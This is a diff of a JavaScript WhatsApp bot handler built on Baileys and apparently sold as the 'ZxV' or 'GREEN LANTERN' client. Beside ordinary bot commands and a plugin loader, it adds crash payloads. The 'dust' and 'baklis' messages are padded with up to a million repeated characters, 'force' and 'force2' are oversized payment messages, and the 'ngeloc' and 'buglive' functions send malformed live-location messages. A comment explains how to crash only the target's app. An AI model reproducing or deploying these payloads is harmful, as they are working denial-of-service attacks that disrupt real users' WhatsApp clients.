@@ -1,18 +1,41 @@
 /*
-> Kalo Mau Recode Kasih Credit gw ›
+
+Kalo Mau Recode Kasih Credit gw ›
 TheZetsubXygen / Ryo
 
-📝 | Created By thezetsuboxygen / Ryo
-🖥️ | Base Ori By thezetsuboxygen / Ryo
+📝 > Created By thezetsuboxygen / Ryo
+🖥️ > Base Ori By thezetsuboxygen / Ryo
 
+🩸 Catatan: Jika Anda membeli Bot ini dan kemudian menjualnya kembali, akses Anda ke Bot akan dihapus, dan nomor yang terhubung dengan Bot akan diblokir secara permanen.
 
+❗ Thanks To -:
+
+Best Regards: >
+ - Alif
+ - Ryozingod (Gw)
+
+All 1S - Universe members, especially for: >
+ - Kyuurzy
+ - Reza
+ - Taufik
+ - Putzxzmoodz
+
+Tes - Bug: > 
+ - Anas
+ - Athena
+ - Nug Hikari
+ 
+Etc: >
+ - Dika Ardnt
+ - Hw Mods (Haikal)
+ - Penyedia Scrape
+ - Penyedia Api
+ - My Brain
+ - Davizinmaker - Inspirate
+ - Thunder X7 - Inspirate
+ - Yang Beli Sc V4 Kemarin (Khususnya Reseller Peler)
+                                   
 */
-
-require('./config')
-const {
-smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize
-} = require('./lib/myfunction')
-//=================================================//
 const { ryozingodConnect, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')
 //=================================================//
 const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
@@ -33,6 +56,7 @@ const primbon = new Primbon()
 const { performance } = require('perf_hooks')
 const dgram = require('dgram')
 const fg = require('api-dylux')
+const path = require('path')
 const cheerio = require('cheerio')
 const ytdl = require("ytdl-core")
 const colors = require('@colors/colors/safe')
@@ -55,6 +79,29 @@ const bochil = require("@bochilteam/scraper")
 const fakeUA = require('fake-useragent')
 const randomUA = fakeUA().toString()
 const fs = require('fs')
+//=================================================//
+module.exports = ryozingod = handler = async (ryozingod, m, chatUpdate, store) => {
+try {
+var body = (
+m.mtype === 'conversation' ? m.message.conversation :
+m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
+m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
+m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
+m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
+m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
+m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
+m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
+m.mtype === 'messageContextInfo' ?
+m.message.buttonsResponseMessage?.selectedButtonId ||
+m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
+m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
+m.text :
+''
+);
+
+//=================================================//
+require('./config')
+const { smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunction')
 //=================================================//
 const {
 addPremiumUser,
@@ -96,34 +143,13 @@ let ntilinkfb =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkfacebook.json')
 let ntilinkig =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkinstagram.json'))
 let ntilinkytch =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkytchannel.json'))
 let ntilinkytvid =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkytvideo.json'))
-
-//=================================================//
-module.exports = ryozingod = async (ryozingod, m, chatUpdate, store) => {
-try {
-var body = (
-m.mtype === 'conversation' ? m.message.conversation :
-m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
-m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
-m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
-m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
-m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
-m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
-m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
-m.mtype === 'messageContextInfo' ?
-m.message.buttonsResponseMessage?.selectedButtonId ||
-m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
-m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
-m.text :
-''
-);
-
 //=================================================//
 const { groupMembers } = m
 var budy = (typeof m.text == 'string' ? m.text : '')
-var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
+const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
+const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
 const isCmd = body.startsWith(prefix)
-const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
-//Kalau mau multi prefix Lu ganti pake ini = const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
+const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ''
 const args = body.trim().split(/ +/).slice(1)
 const pushname = m.pushName || "No Name"
 const text = q = args.join(" ")
@@ -143,9 +169,9 @@ const isContacts = contacts.includes(m.sender)
 const isReseller = [botNumber, ...iniseller, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const isDeveloper = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const isPremium = isDeveloper || isDeveloper || checkPremiumUser(m.sender, orgkaya);
-const isAfkOn = afk.checkAfkUser(m.sender, _afk)    
-
-// Group
+const isAfkOn = afk.checkAfkUser(m.sender, _afk)
+//=================================================//
+//Group
 const groupMetadata = m.isGroup ? await ryozingod.groupMetadata(m.chat).catch(e => {}) : ''
 const groupName = m.isGroup ? groupMetadata.subject : ''
 const participants = m.isGroup ? await groupMetadata.participants : ''
@@ -432,17 +458,18 @@ const setting = db.data.settings[botNumber]
     		onlygrub: false,
 //        welcome: true, 
     		autoread: false,
-    		menuType: 'externalImage' //> buttonImage
+    		menuType: 'imageIos' //> buttonImage
 	    }
 
 } catch (err) {
 console.error(err)
 }
 //=================================================//
-const nulll = fs.readFileSync(`./image/nulll.jpg`)
-const nulll2 = fs.readFileSync(`./image/nulll2.jpg`)
-const mengkece = fs.readFileSync(`./image/mengkece.jpg`)
-const latx = fs.readFileSync(`./image/latx.png`)
+const nulll = fs.readFileSync(`./media/nulll.jpg`)
+const mengkece = fs.readFileSync(`./media/mengkece.jpg`)
+const overlaid = fs.readFileSync(`./media/overlaid.jpg`)
+const overpix = fs.readFileSync(`./media/overpix.png`)
+const latx = fs.readFileSync(`./media/latx.png`)
 const fakedoc = fs.readFileSync(`./src/bruhhh.apk`)
 const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
 //=================================================//
@@ -455,7 +482,6 @@ const mlstalk = require('./lib/mlstalk.js')
 const textpro = require('./lib/textpro.js')
 const photooxy = require('./lib/photooxy.js')
 //=================================================//
-const { sleyer } = require("./virtex/mr.penis01.js")
 const { ios } = require("./virtex/ios.js")
 //=================================================//
 if (!m.key.fromMe && db.data.settings[botNumber].autoread){
@@ -595,8 +621,31 @@ await ryozingod.sendMessage(m.chat, {text: gen2[i], edit: key });
 //=================================================//
 
 
+const dust = {
+  "key": {
+    "remoteJid": "status@broadcast",
+    "participant": "0@s.whatsapp.net",
+    "fromMe": false
+  },
+  "message": {
+  "interactiveMessage": {
+    "header": {
+      "title": ""
+    },
+    "body": {
+      "text": "▾ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 ▾"
+    },
+    "footer": {
+      "text": "By - Ryozingod"
+    },
+    "nativeFlowMessage": {
+      "messageParamsJson": "".repeat(900000)
+    }
+  }
+}
+}
 
-
+//=================================================//
 
 const force = {
 key: {
@@ -609,13 +658,13 @@ remoteJid: ""
 "interactiveMessage": { 
 "header": {
 "hasMediaAttachment": true,
-"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
+"jpegThumbnail": fs.readFileSync(`./media/latx.png`)
 },
 "nativeFlowMessage": {
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"! BY - THEZETSUBOXYGEN \",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }
 ]
 }
@@ -627,25 +676,24 @@ remoteJid: ""
 
 
 //=================================================//
-let mypenis = " ".repeat(550000)
 const force2 = {
 key: {
 participant: `0@s.whatsapp.net`,
 ...(m.chat ? {
-remoteJid: ""
+remoteJid: "status@broadcast"
 } : {})
 },
 'message': {
-"interactiveMessage": { 
+"interactiveMessage": {
 "header": {
 "hasMediaAttachment": true,
-"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
+"jpegThumbnail": fs.readFileSync(`./media/overpix.png`)
 },
 "nativeFlowMessage": {
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"${mypenis}\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }
 ]
 }
@@ -670,7 +718,7 @@ remoteJid: ""
 'message': {
   "eventMessage": {
     "isCanceled": false,
-    "name": "🌠 𝕾𝖕𝖎𝖉𝖊𝖗 𝖂𝖊𝖇🕸️ - Multi Device",
+    "name": "🌠 GREEN LANTERN - Multi Device",
     "description": "Pe",
     "location": {
       "degreesLatitude": 0,
@@ -771,7 +819,7 @@ newsletterAdminInviteMessage: {
 newsletterJid: `120363224727390375@newsletter`,
 newsletterName: `🔥`,
 jpegThumbnail: fakejpg,
-caption: ` 🕷️𝕾𝖕𝖎𝖉𝖊𝖗 𝖂𝖊𝖇🕸️ ? \n ⿻ ${m.body || m.mtype} `,
+caption: ` ZxV - Bug ? \n ⿻ ${m.body || m.mtype} `,
 inviteExpiration: Date.now() + 1814400000
 }
 }
@@ -845,7 +893,7 @@ remoteJid: "status@broadcast"
 message: {
 "extendedTextMessage": {
 "text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
-"title": `🕷️𝕾𝕻𝕴𝕯𝕰𝕽 𝖂𝕰𝕭🕸️ `,
+"title": `▾ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 ▾`,
 'jpegThumbnail': fakejpg,
 }
 }
@@ -867,7 +915,7 @@ message: {
 "jpegThumbnail": fakejpg,
 },
 "title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
-"description": `𝕾𝖕𝖎𝖉𝖊𝖗 🕸️ 𝖂𝖊𝖇 🕷️`,
+"description": `▾ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 ▾`,
 "currencyCode": "IDR",
 "priceAmount1000": "1000000000000000000",
 "retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
@@ -986,21 +1034,18 @@ sendEphemeral: true
 //Reply
 const joreply = async (teks) => {
 await sleep(500)
-let thumbnails = [nulll, nulll2]
-let randomIndex = Math.floor(Math.random() * thumbnails.length)
-let selectedThumbnail = thumbnails[randomIndex]
 return ryozingod.sendMessage(m.chat, {
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: false,
 renderLargerThumbnail: false,
-title: `© ZxV - Client Version 4.0.0`,
+title: `© GREEN LANTERN 𝖢𝗅𝗂𝖾𝗇𝗍 1.0.0`,
 body: `${ucapanWaktu} ${m.pushName} 👋`,
 previewType: "VIDEO",
-thumbnail: selectedThumbnail,
-sourceUrl: `https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk`,
-mediaUrl: `https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk`
+thumbnail: nulll,
+sourceUrl: `${global.url}`,
+mediaUrl: `${global.url}`
 }
 },
 text: teks
@@ -1014,7 +1059,7 @@ await sleep(500)
 // Anti Link
 if (AntiLink) {
 if (budy.toLowerCase().includes("chat.whatsapp.com/")){
-if (!isBotAdmins) return joreply(`${mess.botAdmin}, _𝙰𝚗𝚝𝚒𝚕𝚒𝚗𝚔 𝚞𝚙𝚍𝚊𝚝𝚎𝚍 𝚍𝚘 𝚗𝚔𝚝 𝚜𝚎𝚗𝚍 𝚕𝚒𝚗𝚔𝚜 𝚑𝚎𝚛𝚎_`)
+if (!isBotAdmins) return joreply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
 let gclink = (`https://chat.whatsapp.com/`+await ryozingod.groupInviteCode(m.chat))
 let isLinkThisGc = new RegExp(gclink, 'i')
 let isgclink = isLinkThisGc.test(m.text)
@@ -1068,7 +1113,7 @@ participant: mek.key.participant
 }
 })
 ryozingod.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} 𝙽𝚘 𝚟𝚒𝚛𝚞𝚜 𝚠𝚒𝚕𝚕 𝚋𝚎 𝚊𝚕𝚕𝚘𝚠𝚎𝚍 𝚑𝚎𝚛𝚎i`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
   }
   }
 //anti bad words by geekz and modified by thezetsuboxygen
@@ -1730,20 +1775,38 @@ return build_server + data.image
 }
 //=================================================//
 async function ngeloc(target, kuwoted) {
-var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 viewOnceMessage: {
 message: {
   "liveLocationMessage": {
-    "degreesLatitude": "p",
-    "degreesLongitude": "p",
-    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(60000),
-    "sequenceNumber": "0",
+    "degreesLatitude": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑",
+    "degreesLongitude": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑",
+    "caption": `🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑`,
+    "sequenceNumber": "9",
     "jpegThumbnail": ""
      }
   }
 }
-}), { userJid: target, quoted: kuwoted })
-await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
+}), { userJid: m.chat, quoted: kuwoted })
+//await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id }) Gunakan Ini Jika Ingin Bug Keliatan Di Wa Pengirim
+await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id }); //Gunakan Ini Jika Ingin Bug Hanya Terlihat Di Wa Target ( Benefit - WhatsApp pengguna tidak ikut crash )
+}
+//=================================================//
+async function buglive(target, kuwoted) {
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑",
+    "degreesLongitude": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑",
+    "caption": `🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑`,
+    "sequenceNumber": "9",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: m.chat, quoted: kuwoted })
+await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
 }
 //=================================================//
 async function aipong(target) {
@@ -1813,59 +1876,176 @@ await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }
 //=================================================//
 async function baklis(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
-  'listMessage': {
-    'title': "⟠🕷️🕸️𝕾𝖕𝖎𝖉𝖊𝖗 𝖂𝖊𝖇🕸️🕷️ 々"+" ".repeat(920000),
-        'footerText': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
-        'description': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
-        'buttonText': null,
-        'listType': 2,
-        'productListInfo': {
-          'productSections': [{
-            'title': 'anjay',
-            'products': [
-              { "productId": "4392524570816732" }
-            ]
-          }],
-          'productListHeaderImage': {
-            'productId': '4392524570816732',
-            'jpegThumbnail': null
-          },
-          'businessOwnerJid': '0@s.whatsapp.net'
-        }
-      },
-      'footer': 'puki',
-      'contextInfo': {
-        'expiration': 604800,
-        'ephemeralSettingTimestamp': "1679959486",
-        'entryPointConversionSource': "global_search_new_chat",
-        'entryPointConversionApp': "whatsapp",
-        'entryPointConversionDelaySeconds': 9,
-        'disappearingMode': {
-          'initiator': "INITIATED_BY_ME"
-        }
-      },
-      'selectListType': 2,
-      'product_header_info': {
-        'product_header_info_id': 292928282928,
-        'product_header_is_rejected': false
-      }
-    }), { userJid: target, quoted: ryobug });
+  "interactiveMessage": {
+    "header": {
+      "title": ""
+    },
+    "body": {
+      "text": "▾ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 ▾"
+    },
+    "footer": {
+      "text": "By - Ryozingod"
+    },
+    "nativeFlowMessage": {
+      "messageParamsJson": " ".repeat(1000000)
+    }
+  }
+}), { userJid: target, quoted: ryobug });
 await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
 }
 //=================================================//
-/*if (m.message) {
-console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
-}
-*/
-
 if (!isGroup && !isDeveloper && db.data.settings[botNumber].onlygrub ) {
 	if (command){
 return joreply(` Halo ${m.pushName}! Karena Kami Ingin Mengurangi Spam, Silakan Gunakan Bot di Grup Chat !`)
 }
 }
-
 //=================================================//
+// Ngambil semua plugin dari direktori dan subdirektori
+const loadPlugins = (directory) => {
+let plugins = []
+const folders = fs.readdirSync(directory)
+folders.forEach(folder => {
+const folderPath = path.join(directory, folder)
+if (fs.lstatSync(folderPath).isDirectory()) {
+const files = fs.readdirSync(folderPath)
+files.forEach(file => {
+const filePath = path.join(folderPath, file)
+if (filePath.endsWith('.js')) {
+delete require.cache[require.resolve(filePath)]
+const plugin = require(filePath)
+plugin.filePath = filePath
+plugins.push(plugin)
+}
+})
+}
+})
+return plugins
+}
 
+// Ngambil semua plugin dari direktori zetsubo
+const plugins = loadPlugins(path.resolve(__dirname, './zetsubo'));
+
+const context = {
+ryozingod,
+m,
+chatUpdate,
+store,
+smsg,
+getGroupAdmins,
+formatp,
+h2k,
+tanggal,
+formatDate,
+getTime,
+isUrl,
+sleep,
+clockString,
+msToDate,
+sort,
+toNumber,
+enumGetKey,
+runtime,
+fetchJson,
+getBuffer,
+jsonformat,
+delay,
+format,
+logic,
+generateProfilePicture,
+parseMention,
+getRandom,
+pickRandom,
+reSize,
+ngeloc,
+buglive,
+baklis,
+fpoll,
+pirgam,
+penghitaman,
+bakdok,
+aipong,
+joreply,
+qcontact,
+qloc2,
+qloc,
+qvideo,
+qinvite,
+qgif,
+qtoko,
+qtext,
+qvn,
+qdoc,
+qpay,
+ryobut,
+ryobug,
+ryovoice,
+ryoreqphone,
+qevent,
+force2,
+force,
+dust,
+loading,
+groupMetadata,
+groupName,
+participants,
+groupAdmins,
+isBotAdmins,
+isAdmins,
+isGroup,
+groupOwner,
+isGroupOwner,
+groupMembers,
+prefixRegex,
+prefix,
+isCmd,
+command,
+args,
+pushname,
+text,
+q,
+fatkuns,
+quoted,
+mime,
+qmsg,
+isMedia,
+botNumber,
+itsMe,
+orgkaya,
+kontributor,
+iniseller,
+contacts,
+isContacts,
+isReseller,
+isDeveloper,
+isAfkOn,
+dafontSearch,
+dafontDown,
+scp1,
+ffstalk,
+githubstalk,
+npmstalk,
+mlstalk,
+textpro,
+photooxy,
+nulll,
+mengkece,
+overlaid,
+overpix,
+latx,
+fakedoc,
+fakejpg
+}
+
+// Kode ini ngeliat plugin satu per satu, kalo nemu plugin yang cocok ama command yang diterima, dia langsung manggil fungsi operate-nya dan berhenti.
+let handled = false
+for (const plugin of plugins) {
+if (plugin.command === command) {
+await plugin.operate(context)
+handled = true
+break
+}
+}
+//=================================================//
 if (m.message) {
   if (isCmd && !m.isGroup) {
     console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
@@ -1885,9 +2065,14 @@ if (m.message) {
   }
 }
 
+/*if (m.message) {
+console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
+}
+*/
 //=================================================//
+//Klo plugin kagak mau tanggung jawab, lempar tanggung jawabnya ke ke switch-case 😹
+if (!handled) {
 switch (command) {
-// Status
 case 'public': {
 if (!isPremium) return joreply(mess.premium) 
 ryozingod.public = true
@@ -1902,47 +2087,32 @@ joreply(pee + '😁🖕')
 break
 //=================================================//
 //Menu
-case "menu": case "help": {
-let jinjing = [nulll, nulll2]
-let randomIndex = Math.floor(Math.random() * jinjing.length)
-let mydick = jinjing[randomIndex]
-
+case "menu": case "help": case "helep": {
 //text menu
-let penisbengkok = `
-*${ucapanWaktu} @${m.sender.split("@")[0]}*
-
-┏❐  ⌜ 𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥 ⌟  ❐
-┃✢ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
-┃✢ Library : WS-Baileys
-┃✢ Type : Case
-┃✢ Status : Ready
-┃✢ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
-┃✢ User : ${Object.keys(db.data.users).length}
-┃✢ Prefix : Single
-┗❐
-
-𝐂𝐥𝐚𝐬𝐬𝐢𝐜 © Copyright`
-
 let njing = `
-*${ucapanWaktu} @${m.sender.split("@")[0]}*
+   *[ 🧛‍♂️😈 ]  •  𝐆𝐇𝐎𝐒𝐓*
 
-┏❐  ⌜ 𝘿𝙀𝙑𝙄𝙇 𝙎𝙋𝙄𝘿𝙀𝙍⌟  ❐
-┃✢ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
-┃✢ Library : WS-Baileys
